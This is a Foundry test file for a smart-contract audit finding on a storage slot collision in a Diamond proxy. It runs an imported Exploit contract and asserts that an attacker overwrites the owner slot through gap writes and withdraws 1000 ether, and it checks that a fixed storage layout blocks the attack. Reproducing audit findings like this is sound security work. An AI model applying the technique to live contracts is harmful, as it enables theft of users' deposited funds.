// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {
    Exploit,
    CollToken,
    Diamond,
    DiamondFixed,
    UserFixed
} from "./40194-h-01-storage-slot-collision-pashov-audit-group-none-gainsnet.sol";

contract Finding40194Test is Test {
    function test_exploit_tail_write_moves_1000() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.taken(), 1000 ether, "attacker withdrew 1000");
        assertEq(e.token().balanceOf(address(e)), 1000 ether, "1000 moved");
        assertEq(e.diamond().owner(), address(e), "owner overwritten");
        assertEq(e.diamond().balance(), 0, "otc balance cleared by the withdraw");
    }

    function test_gap48_is_otc_owner_slot() public {
        CollToken token = new CollToken();
        Diamond diamond = new Diamond(token);
        diamond.writeTail(47, 777);
        diamond.writeTail(48, uint256(uint160(address(0xBEEF))));

        assertEq(vm.load(address(diamond), bytes32(uint256(601))), bytes32(uint256(777)), "gap 47 is slot 601");
        assertEq(vm.load(address(diamond), bytes32(uint256(602))), bytes32(uint256(uint160(address(0xBEEF)))), "gap 48 is slot 602");
    }

    function test_control_otc_at_603_does_not_move_the_deposit() public {
        CollToken token = new CollToken();
        DiamondFixed diamond = new DiamondFixed(token);
        UserFixed user = new UserFixed();
        token.mint(address(user), 1000 ether);
        user.fundFixed(diamond, token, 1000 ether);

        diamond.writeTail(48, uint256(uint160(address(this))));

        vm.expectRevert(bytes("owner"));
        diamond.withdraw();
        assertEq(diamond.owner(), address(user), "owner unchanged");
        assertEq(token.balanceOf(address(diamond)), 1000 ether, "1000 stayed in the diamond");
    }
}
